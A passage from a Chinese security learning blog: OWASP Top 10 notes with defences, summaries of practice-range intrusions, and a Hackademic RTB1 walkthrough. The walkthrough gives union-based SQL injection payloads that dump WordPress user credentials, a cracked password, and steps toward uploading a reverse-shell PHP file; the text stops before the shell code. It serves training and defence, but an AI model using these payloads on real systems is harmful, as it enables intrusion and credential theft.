<h3 id="👉🏻TOP5：安全配置不当"><a href="#👉🏻TOP5：安全配置不当" class="headerlink" title="👉🏻TOP5：安全配置不当"></a>👉🏻TOP5：安全配置不当</h3><p>通常由于不安全的默认配置、不完整的临时配置、不必要的功能启用或者安装、开源云储存、错误的http标头配置、包含敏感信息的详细报错信息。因此不仅要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级</p>
<p><strong>案例</strong></p>
<ol>
<li>Tomcat、Apache服务器后台弱口令和服务器的不当配置容易被利用</li>
<li>中国电信交换机弱口令</li>
<li>行业内设备（比如华为的SmartAXMT调制解调器初始ip和默认密码是xxxxx都是已知的网上能找到的）</li>
</ol>
<p><strong>防范</strong></p>
<ol>
<li>按照加固手册加固</li>
<li>搭建最小化平台，这个平台不包含任何不必要的功能、组件、文档和示例，移除或者不安装不适用的功能和框架</li>
<li>临时文件及时删除</li>
</ol>
<p>​        </p>
<p>​           </p>
<h3 id="👉🏻TOP6：易受攻击和淘汰的组件"><a href="#👉🏻TOP6：易受攻击和淘汰的组件" class="headerlink" title="👉🏻TOP6：易受攻击和淘汰的组件"></a>👉🏻TOP6：易受攻击和淘汰的组件</h3><p>组件（例如库、框架、其他软件模块）拥有和应用程序相同的权限。如果应用程序中有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或者服务器接管，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御，造成攻击产生影响</p>
<p><strong>场景</strong></p>
<ol>
<li>某个组件出现新的漏洞，攻击者可能凭借这个情报利用这个组件漏洞攻击应用程序（信息不对称）</li>
</ol>
<p><strong>防范</strong></p>
<ol>
<li>移除不使用的依赖、不需要的功能、组件、文件和文档</li>
<li>仅从官方渠道获取组件，并使用签名机制来降低组件被篡改或被加入恶意漏洞的风险</li>
<li>持续监控CVE、NVD等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能，订阅组件漏洞最新信息的邮件以获取即时信息</li>
</ol>
<p>​           </p>
<p>​         </p>
<h3 id="👉🏻TOP7：认证及验证机制失效"><a href="#👉🏻TOP7：认证及验证机制失效" class="headerlink" title="👉🏻TOP7：认证及验证机制失效"></a>👉🏻TOP7：认证及验证机制失效</h3><p>错误使用应用程序的身份认证和会话功能管理，使攻击者能够破译密码、密钥或者会话令牌，或者利用其他开发缺陷冒充其他用户身份。web程序开发者过于专注程序功能开发，可能会建立自定义的认证和会话方案，这可能会存在漏洞。可能会在推出、密码管理、超时、密码找回、账户更新等方面存在漏洞。</p>
<p>也就是说在密码等重要数据进行交互的过程中程序存在问题，并且被利用</p>
<p><strong>情景</strong></p>
<ol>
<li>应用程序没有实施自动化威胁保护或撞库攻击保护的情况下，使用已知列表密码撞库（比如旧密码泄露）</li>
<li>使用明文、加密或者弱散列密码或者用户重复使用同一种密码，容易被暴力破解（不是特殊加密方法的话密码破解可能会很快）</li>
<li>缺少或失效的多因素身份验证</li>
<li>暴露url中的会话id</li>
<li>会话ID使用时间过长</li>
</ol>
<p><strong>防范</strong></p>
<ol>
<li>使用多因素身份验证</li>
<li>检查弱口令，模拟爆破操作</li>
<li>对API和控制器的访问进行速率限制，限制或逐渐延迟失败的登录尝试（避免高速爆破），最大限度降低自动化攻击工具的危害（也会有后续处置，比如后台发现某个ip多次异常尝试且多次失败，就把ip封了</li>
<li>session id 每隔一段时间就生成新的高度负责的新随机会话id。这个id不能出现在url中，登出、闲置、绝对超时的时候就使其失效</li>
</ol>
<p>​    </p>
<h3 id="👉🏻TOP8：软件和数据完整性失效-Software-and-Data-Integrity-Failures"><a href="#👉🏻TOP8：软件和数据完整性失效-Software-and-Data-Integrity-Failures" class="headerlink" title="👉🏻TOP8：软件和数据完整性失效 Software and Data Integrity Failures"></a>👉🏻TOP8：软件和数据完整性失效 Software and Data Integrity Failures</h3><p><strong>简介</strong></p>
<p>软件更新、关键资料（critical data）、持续集成&#x2F;持续部署（CI&#x2F;CD）流程等关键内容没有经过完整性验证导致产生的漏洞</p>
<blockquote>
<p>软件更新：指在已发布的软件版本中修复漏洞、增加功能或改进性能等目的而发布的新版本</p>
<p>关键资料：软件更新过程中使用的关键数据，比如用户隐私信息、安全凭证、加密密钥等</p>
<p>持续集成&#x2F;持续部署（CI&#x2F;CD）流程：旨在通过自动化构建、测试和部署流程来实现快速、频繁的软件发布。持续集成是指频繁地将开发人员的代码集成到共享存储库中，持续部署是指自动将通过测试的代码部署到生产环境中</p>
<p>没有经过完整性验证：指的是在软件更新过程中，假设了某些关键资料的完整性已经被验证，或者假设了CI&#x2F;CD流程的整体安全性和正确性，而实际上并没有进行充分的验证。这样的假设可能导致漏洞或安全风险的存在</p>
</blockquote>
<p>​                                                                                           </p>
<p><strong>常见情况</strong></p>
<ol>
<li><strong>不安全的序列化和反序列化</strong>：当对象或数据被编码或序列化成攻击者可以看到和修改的结构时，容易受到不安全的反序列化攻击</li>
<li><strong>依赖不受信任来源</strong>：应用程序来自不被信任的来源，包括一些不被信任的外部库、内容传递网络(CND)、库或者模组</li>
<li><strong>不安全的持续集成&#x2F;持续部署 (CI&#x2F;CD) 流程</strong>：不安全的集成&#x2F;部署(CI&#x2F;CD)流程可能导致未经授权的访问、恶意代码注入或系统破坏</li>
<li><strong>自动更新的安全性问题</strong>：很多应用程序会进行自动更新，在缺乏完整性验证的情况下把更新包应用到之前信任的应用程序上。这里攻击者可以上传自制的所谓“更新”内容在所有应用程序上运行，达到窃取信息等目的</li>
</ol>
<p>​                                          </p>
<p><strong>如何预防？</strong></p>
<ol>
<li>使用数字签名或者类似的机制验证软件数据来源正确且未被更改</li>
<li>使用可信任度较高的库和依赖项；确保安全工具验证组件不包含已知漏洞；尽量保证代码在构建和部署过程中的完整性；确保有代码审计和配置更改的审查流程，避免恶意代码或者恶意配置被引入软件流程</li>
<li>确保未签名或未加密的序列化数据不被发送到不受信任的客户端，除非有完整性检查或者数字签名来检测数据是否被篡改或重放。</li>
</ol>
<p>​        </p>
<p><strong>防范举例</strong></p>
<p>安卓手机，通过官方的应用商城安装软件相对比较安全，因为应用商城会对更新包和软件包进行检测以防范这种漏洞。如果从浏览器或者其他途径下载软件手机会警告用户软件可能不安全。</p>
<p>​                </p>
<p>​            </p>
<h3 id="👉🏻TOP9：安全记录记录和监控失效"><a href="#👉🏻TOP9：安全记录记录和监控失效" class="headerlink" title="👉🏻TOP9：安全记录记录和监控失效"></a>👉🏻TOP9：安全记录记录和监控失效</h3><p><strong>概念</strong></p>
<p>自己内部的检查能力不足，没办法在别人攻击自己的时候发现自己被攻击了</p>
<p><strong>场景</strong></p>
<ol>
<li><p>印度一家大型航空公司发生涉及数百万乘客超过十年包括护照及信用卡资料等个人资料的资料泄漏。资料泄漏发生在第三方供应商提供的云端服务，该供应商在资料泄漏发生一段时间后通知航空公司。</p>
</li>
<li><p>未记录可审计的事件，如登录、登录失败、高额交易</p>
</li>
<li><p>告警和错误事件未能产生或者产生不足和不清晰的日志信息</p>
</li>
<li><p>日志信息仅在本地存储，日志信息可能被消掉</p>
</li>
<li><p>没有利用应用系统、API的日志信息监控可以活动</p>
</li>
<li><p>对于实时或者准实时攻击，应用程序无法检测、处理和告警</p>
</li>
</ol>
<p><strong>防范</strong></p>
<ol>
<li>确保所有的登录、访问控制失效、输入验证失败能够被记录到日志中去，保留足够的用户上下文信息，识别可疑或者恶意账户，为货期取证预留时间</li>
<li>日志集中管理、备份</li>
<li>审计信息保存在只能增加不能删除的数据库中</li>
<li>建立有效的告警机制，使可疑活动在可接受的范围内被发现和应对</li>
</ol>
<h3 id="👉🏻TOP10：服务器端请求伪造"><a href="#👉🏻TOP10：服务器端请求伪造" class="headerlink" title="👉🏻TOP10：服务器端请求伪造"></a>👉🏻TOP10：服务器端请求伪造</h3><p>攻击者利用服务器上的应用程序，发送伪造请求到服务器内部或者其他内网，从而达到攻击的目的</p>
<ol>
<li>限制访问权限：确保服务器上的应用程序只能访问必要的资源，避免访问敏感的内部网络资源。</li>
<li>过滤和验证输入： 对用户输入进行有效的过滤和验证，确保输入的URL是合法的且安全的，防止攻击者利用URL参数进行攻击。</li>
<li>使用白名单： 配置白名单，只允许应用程序访问特定的URL或者IP地址，从而避免访问未经授权的资源。</li>
<li>使用防火墙和WAF： 配置防火墙和Web应用程序防火墙（WAF），监控和过滤服务器上的入站和出站流量，阻止恶意请求和攻击。</li>
<li>更新和维护： 定期更新和维护服务器上的软件和组件，修复已知的漏洞和安全问题</li>
</ol>
<p><strong>XXE</strong></p>
<p>应用程序解析XML文件时包含了对外部实体的引用，攻击者传递恶意包含XML代码的文件，读取指定服务器资源</p>
<p>防范：</p>
<ol>
<li>使用简单的数据格式（如JSON），避免对敏感数据序列化</li>
<li>服务器端实行白名单验证、过滤、清除，防止在XML或者标题中出现恶意数据</li>
<li>及时更新或者修复应用程序和底层操作系统使用的所有XML处理器和库</li>
<li></li>
</ol>
<h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF-跨站请求伪造"></a>CSRF-跨站请求伪造</h3><p>利用用户在某个网站上已经登录的身份，在用户不知情的情况下，在另一个网站上执行一些非法操作</p>
<p>已经在购物网站上登录，然后收到一封看起来很正常的电子邮件。点击邮件中的链接，不知不觉地执行了一个操作，比如购买了一件商品或者更改了密码</p>
<ol>
<li>在每个表单提交或者敏感操作中包含一个随机生成的Token，并在后端进行验证。这个Token在每次请求中都会发生变化，攻击者无法伪造有效的Token，从而阻止了CSRF攻击。</li>
<li>限制cookie的发送范围，只允许来自同一站点的请求携带Cookie，防止跨站请求伪造</li>
<li>服务器端对请求的Referer进行验证，确保请求来源合法</li>
<li>执行敏感操作的请求，需要用户进行双重确认，比如输入密码、验证码等</li>
<li>对于执行敏感操作的Session，设置短暂有效期，减少攻击者利用的时间窗口</li>
<li>使用POST方法而不是GET方法来执行敏感操作</li>
</ol>
<h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><p>将可执行的前端脚本代码（一般为JavaScript）植入到网页中，通过利用网页开发时留下的漏洞，注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</p>
<p>反射型：攻击者将JS代码作为请求参数放置URL中，诱导用户点击，落入陷阱<br>存储型：将攻击脚本入库存储，在后面进行查询时，再将攻击脚本渲染进网页，返回给浏览器触发执行</p>
<ol>
<li>输入验证和过滤： 对用户输入的内容进行严格的验证和过滤，确保其中不包含恶意脚本。可以使用白名单过滤、转义特殊字符等方式来防止</li>
<li>输出编码：使用合适的编码方式编码，防止浏览器误将其中的内容解析为可执行的脚本。常用的编码方式包括HTML编码、URL编码等。</li>
<li>HTTP头部设置： 在HTTP响应头中设置合适的Content-Security-Policy（CSP）头部，限制页面加载的资源和执行的脚本</li>
<li>将敏感信息存储在HttpOnly Cookie中，这样即使页面存在XSS漏洞，攻击者也无法窃取到Cookie中的敏感信息。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/11/06/%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/06/%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">10.07-11.05(2023)总结与拓展</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-06 23:56:06" itemprop="dateCreated datePublished" datetime="2023-11-06T23:56:06+08:00">2023-11-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-12 09:17:30" itemprop="dateModified" datetime="2024-03-12T09:17:30+08:00">2024-03-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="W1r3s靶场攻击"><a href="#W1r3s靶场攻击" class="headerlink" title="W1r3s靶场攻击"></a>W1r3s靶场攻击</h4><p><strong>思路</strong>：由于是内网渗透，首先进行主机的扫描来发现目标主机，之后对目标主机进行端口扫描查看开放的端口，在这里发现其21端口允许匿名登陆，以此为攻击点，对其进行漏洞脚本扫描，得到 &#x2F;wordpress&#x2F;wp-login.php，发现其漏洞，之后进行ftp匿名登录，将worktodo.txt以及employee-names.txt下载下来，得到一个新的ftp服务器以及两个字符串，访问nmap得到的 &#x2F;wordpress&#x2F;wp-login.php发现为一个登陆页面，常见的用户名密码登陆失败，决定进行目录爆破，在这里使用gobuster工具进行目录爆破，得到三个结果，挨个访问得到一个安装页面，在此页面中发现为cuppa cms，接下来进行cuppa cms渗透，通过cuppa cms的利用文件，可发现漏洞在 &#x2F;alerts&#x2F;alertConfigField.php中，查看发现为使用post方法传递参数并且将他拼接至前面文件中包含过来，使用curl命令得到密码的内容，发现加密，使用John进行破解得到破解后的密码，最后使用ssh获取shell与提权，通过破解过的密码成功获取root权限。</p>
<p><strong>攻击工具</strong>：nmap，gobuster，John</p>
<p><strong>防御方法</strong>：关闭匿名登陆</p>
<h4 id="shop1靶场"><a href="#shop1靶场" class="headerlink" title="shop1靶场"></a>shop1靶场</h4><p><strong>思路</strong>：首先尝试默认登录后台未成功，使用阿D注入工具（SQL注入的渗透测试工具）扫描注入点，等到两组登录信息，登录成功。尝试上传一句话木马，更改为.jpg格式，将图片与木马链接上传并抓包。在信息路径下添加888.asp.jpg，进行00截断（利用了字符串的结束标识符“0x00”的特性，攻击者可以在目标文件名或URL中手动添加字符串标识符，将后面的内容进行截断，从而绕过某些安全检测），木马添加成功，在菜刀工具中输入木马路径即可修改任意文件。</p>
<p><strong>攻击工具</strong>：阿D注入工具、菜刀、MD5</p>
<p><strong>防御方法</strong>：</p>
<p>密码强度和保护（启用多因素身份验证可以增加额外的安全层）</p>
<p>安全配置和更新（及时更新软件和操作系统，以及设置适当的安全组和防火墙规则）</p>
<p>输入验证和过滤（对所有用户输入进行验证和过滤）</p>
<p>文件上传安全控制（限制上传的文件类型和大小并设置合适的文件存储路径和命名规则。）</p>
<p>安全扫描和监控（定期进行安全扫描和监控，以发现和修复潜在的安全漏洞）</p>
<p>访问控制和权限管理（实施严格的权限管理策略）</p>
<h4 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h4><p><strong>攻击思路和原理</strong>：sql注入与数据库对话，获得账号和密码，进入后台，上传木马，最后连接菜刀，达到控制网站的目的。</p>
<p><strong>防御方法</strong>：防御sql注入可以将sql语句转化成无法执行的sql语句，这样攻击者就无法和数据库进行对话。</p>
<h4 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h4><p><strong>攻击思路和原理</strong>：通过御剑扫描后台，这里是二级目录，然后获得flag</p>
<p><strong>防御方法</strong>：后台路径如果和大家的认知一样，就很容易被发现，因此设计网站时需要把后台的路径名设置的和认知不一样。</p>
<h4 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h4><p>网站做了WAF过滤防护，因此用cookie注入进行绕过，获得账号和密码，再用御剑扫描，获得后台路径，输入账号密码，得到flag</p>
<h4 id="红日靶场"><a href="#红日靶场" class="headerlink" title="红日靶场"></a>红日靶场</h4><p><strong>思路</strong>：首先进行网络配置，添加一个外网，一个内网。将攻击机kali第一个适配器连接互联网，第二个使用外网。将web服务器（win7）,一个适配器连内网，第二个连外网。开始进行web渗透，通过端口扫描、目录爆破等尝试操作，进行信息收集，主要目的是为发现有关目标系统的漏洞，这是后续进行攻击的前提。接下来是利用漏洞：目录爆破发现了后台登录（phpmyadmin页面），通过bp暴力破解之后成功登录，之后在SQL界面尝试用日志写下一句话木马getshell,成功执行。通过webshell将探测等攻击文件成功植入(目标主机)win7，拿到权限。之后就进入到，权限维持和内网渗透的步骤了主要收集是关于域控的环境探测的信息，接着尝试使用远程桌面连接控制失败，用msf创建并运行木马尝试修改密码，提权成功。获取了域用户的密码信息，然后开始内网主机探测（扫描内网网段），至此内网信息收集结束。最后是横向移动：对域控渗透并进行IPC连接。让域控访问win7的指定端口，win7监听指定端口并将监听到的流量转发给kali的指定端口，在攻击机（kali）上监听，成功获取域控的shell。</p>
<h4 id="Hackdamic"><a href="#Hackdamic" class="headerlink" title="Hackdamic"></a>Hackdamic</h4><p><strong>思路</strong>：</p>
<p>①主机发现和端口扫描</p>
<p>②Web渗透：发现cms是WordPress 1.5.1.1，searchsploit发现可能存在SQL注入漏洞。在超链接Uncategorized的url下可以看到参数cat，尝试添加单引号’发现报错并回显了SQL查询语句，找到了SQL注入的位置。</p>
<p>③手工进行SQL注入，通过order by确定列数，再通过联合查询执行我们想要的代码。Google搜索WordPress的数据库结构，构造我们的查询语句。</p>
<p>④文件上传：拿到凭据后，登录WordPress后台，设置允许上传php文件，并上传反弹shell的php代码，得到了文件上传的路径。开启nc监听后，访问shell.php路径，触发了代码执行，拿到了初始Shell。</p>
<p>内核提权：由于内核版本老旧，寻找内核提权的exp，成功提权。</p>
<p><strong>防御方法</strong>：</p>
<p>-防御SQL注入，采取以下措施：</p>
<p>1.输入过滤：对用户输入的数据进行过滤和验证，确保其中不包含任何恶意的SQL查询语句。</p>
<p>2.参数化查询：使用参数化查询或预编译语句来减少SQL注入攻击的风险。</p>
<p>-防御文件上传漏洞，采取以下措施：</p>
<p>1.文件类型检查：对用户上传的文件进行类型检查，只接受可信的文件类型。</p>
<p>2.文件内容验证：在上传文件后，对文件内容进行检查，确认其是否符合预期的格式和结构。</p>
<p>3.文件名处理：对用户上传的文件名进行检查和处理，避免文件名中包含特殊字符或路径遍历漏洞。</p>
<p>4.文件存储位置：将上传的文件存储在非web根目录下。</p>
<p>5.文件大小限制：限制上传文件的大小，避免上传过大的文件导致服务器资源耗尽。</p>
<p>6.输入过滤和验证：对用户上传的文件名和其他相关字段进行输入过滤和验证，确保其中不包含恶意代码。</p>
<p>7.权限控制：为不同用户分配不同的上传权限，并根据需要对上传文件进行审核或审查。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/" class="post-title-link" itemprop="url">Hackdamic</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-02 13:20:51" itemprop="dateCreated datePublished" datetime="2023-11-02T13:20:51+08:00">2023-11-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-12 09:16:16" itemprop="dateModified" datetime="2024-03-12T09:16:16+08:00">2024-03-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="Hackdamic靶机"><a href="#Hackdamic靶机" class="headerlink" title="Hackdamic靶机"></a><strong>Hackdamic靶机</strong></h3><p>扫描虚拟机</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87157.png" class title="This is an test image">  

<p>编辑虚拟机设置</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87158.png" class title="This is an test image">  

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87159.png" class title="This is an test image">  

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87160.png" class title="This is an test image">  

<p><strong>信息收集</strong></p>
<p>Nmap扫描</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87161.png" class title="This is an test image">  

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87162.png" class title="This is an test image">  

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87163.png" class title="This is an test image">  



<p>可以看到开放的端口和对应的服务</p>
<table>
<thead>
<tr>
<th>Port</th>
<th>service</th>
</tr>
</thead>
<tbody><tr>
<td>22&#x2F;tcp</td>
<td>ssh</td>
</tr>
<tr>
<td>80&#x2F;tcp</td>
<td>web</td>
</tr>
</tbody></table>
<p>Attempt to access port 80</p>
<p>scan information on web page</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87164.png" class title="This is an test image">  

<p>Plug-in viewing framework</p>
<p><a target="_blank" rel="noopener" href="http://192.168.182.131/Hackademic_RTB1/?p=%E2%80%99%E2%80%A6%E2%80%99">http://192.168.182.131/Hackademic_RTB1/?p=’…’</a></p>
<p><a target="_blank" rel="noopener" href="http://192.168.31.162/Hackademic_RTB1/?cat=1">http://192.168.182.131/Hackademic_RTB1&#x2F;?cat&#x3D;1</a></p>
<p><strong>反弹shell</strong></p>
<p>使用dirsearch scan</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87165.png" class title="This is an test image">  

<p>没有结果，换一个路径</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87166.png" class title="This is an test image">  

<p>找到后台</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87167.png" class title="This is an test image">  

<p>有两种方法：1. sql注入</p>
<p>​                       2. 弱密码爆破</p>
<p>查看网页源代码看看有没有cms的信息</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87168.png" class title="This is an test image">  

<p>我们直接看到这个cms是WordPress的1.5.1.1版本。然后可以searchsploit一下有啥漏洞：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87169.png" class title="This is an test image">  

<p>重点观察版本匹配的开头两个，说存在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>，因此接下来的渗透重点关注SQL注入</p>
<p>尝试SQL注入吧，在参数最后加一个引号，把参数改为cat&#x3D;1’</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87170.png" class title="This is an test image">  

<p> 报错了，而且回显了数据库查询语句：SELECT * FROM wp_categories WHERE cat_ID &#x3D; 1\&#39; LIMIT 1</p>
<p>先尝试获取数据库到底有多少列，通过order by [num]的方法（按照第[num]列排序），只要页面没有出现报错，就说明数据库至少有[num]列。order by 5是的界面如下</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87171.png" class title="This is an test image">  

<p> order by 6时出现了报错，说明数据库中一共有5列数据：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87172.png" class title="This is an test image">   

<p>接下来用联合查询的方法进行注入，思考SQL查询语句，要保证后台执行我们的联合查询union select语句，只要将cat_ID的值设置为0，这样就无法查询到结果，相当于只执行了union select的语句。如果将url中的参数改为cat&#x3D;0 union select 1,2,3,4,5那么SQL查询语句将会是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM wp_categories WHERE cat_ID = 0 union select 1,2,3,4,5 LIMIT 1</span><br></pre></td></tr></table></figure>

<p>LIMIT 1限制了只会显示一条结果，由于SELECT * FROM wp_categories WHERE cat_ID &#x3D; 0无法查询到结果，因此相当于只执行了select 1,2,3,4,5 LIMIT 1，界面如下：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87173.png" class title="This is an test image">   

<p> 此处非常关键，注意上图中引号内的内容变为了2，因此select 1,2,3,4,5这个语句中2的位置可以进行查询，并回显到前端，我们可以把2修改为version()以查询MySQL的版本，这样参数修改为cat &#x3D; 0 union select 1,version(),3,4,5结果如下：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87174.png" class title="This is an test image">   

<p>回显了版本</p>
<p>由于WordPress是非常著名的cms，他的配置是固定的，可以Google查到WordPress1.5.1.1对应的数据库结构</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87175.png" class title="This is an test image">   

<p>找到了wordpress 1.5.1版本下存在的表的结构，有一个名为wp_users的表，下面有user_login,user_pass,user_level（用户名，密码，权限）等关心的列</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87176.png" class title="This is an test image">   

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,user_login,user_pass,user_level from wp-users</span><br></pre></td></tr></table></figure>

<p>比如可以查询user_login试试cat&#x3D;0 union select 1,user_login,3,4,5 from wp_users</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87177.png" class title="This is an test image">   

<p>成功查到了一天账号GeorgeMiller，但受限于LIMIT 1,我们只看到了这一个用户，此时可以用group_concat函数让一行内显示所有信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat=0 union select 1,group_concat(user_login),3,4,5 from wp_users</span><br></pre></td></tr></table></figure>

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87178.png" class title="This is an test image">   

<p>把id，user_login，user_pass ，user_level这几个都注入出来</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87179.png" class title="This is an test image">   

<p>可以找到权限级别user_level最高的用户是GeorgeMiller，他的user_level是10，然后我们破解他的密码哈希7cbb3252ba6b7e9c422fac5334d22054</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87180.png" class title="This is an test image">   

<p>很容易得到是md5，然后找个在线网站Decrypt MD5, SHA1, MySQL, NTLM, SHA256, MD5 Email, SHA256 Email, SHA512, Wordpress, Bcrypt hashes for free online破解即可：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87181.png" class title="This is an test image">    

<p>密码是q1w2e3</p>
<p>下面通过用户名GeorgeMiller，密码q1w2e3登录WordPress后台</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87182.png" class title="This is an test image">    

<p>设置允许php文件上传</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87183.png" class title="This is an test image">    

<p>设置成功后，我们可以发现菜单中出现了Upload界面，我们可以上传一个反弹shell的php文件，即shell.php，代码如下，其中10.10.10.128是kali的ip，1234是一会接收shell的端口：</p>
